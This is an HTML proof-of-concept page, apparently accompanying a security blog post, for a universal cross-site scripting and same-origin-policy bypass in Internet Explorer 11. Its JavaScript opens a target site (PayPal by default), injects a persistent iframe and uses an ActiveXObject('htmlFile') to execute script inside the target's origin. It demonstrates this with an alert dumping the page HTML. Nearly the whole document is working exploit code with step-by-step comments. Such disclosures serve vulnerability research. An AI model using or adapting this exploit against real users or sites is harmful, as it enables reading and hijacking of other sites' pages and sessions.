
<html>
<head>
	<title>UXSS/SOP Bypass IE11</title>
</head>
<body>
<h1>UXSS/SOP Bypass IE11</h1>
<input type="text" id="iUrl" size=30 value="https://www.paypal.com">&nbsp;&nbsp;<input type="button" value="Open and Inject" onclick="main()" />
<br /><br /><br /><br />
<hr />
<br /><br />
The details about this PoC are described here: <a href="https://www.brokenbrowser.com/uxss-ie-htmlfile">UXSS/SOP Bypass IE11 ActiveXObject</a>
<br /><br />
Questions? Ping me here: <a href="https://twitter.com/magicmac2000">@magicmac2000</a>

<script>
function main()
{
	w = window.open("redir.php?WAIT=1&URL=" + iUrl.value, "PX");

	// Create and inject an iFrame in the target window
	ifr = w.document.createElement('iframe');
	w.document.appendChild(ifr);
	
	// Initialize the iFrame
	w[0].document.open();
	w[0].document.close();
	
	// Pass a reference to the top window
	// So the iFrame can access even after the redirect.
	w[0]._top = w;
	
	// The following line saves a reference of the opening window
	// into the iFrame but is never used in our JavaScript code.
	// However, it connects the iFrame to a window that still exists
	// Which makes it "more durable".
	// Test by yourself. Remove the next line and see how the iFrame
	// dies a couple of seconds after Paypal loads.
	w[0].not_used = window;
	
	// Finally, once Paypal is loaded (or loading, same thing) we create the
	// ActiveXObject within the injected iFrame.
	w[0].setTimeout('alert("[ Thread Blocked to prevent iFrame destruction ]\\n\\nClose this alert once the address bar changes to the target site.");' +
					'doc = new ActiveXObject("htmlFile");' +
					'doc.Script.opener = _top;' +
					'doc.Script.setTimeout("opener.location = \'javascript:alert(document.all[0].outerHTML)\'");');

}
</script>
<br /><br /><br />

</body>
</html>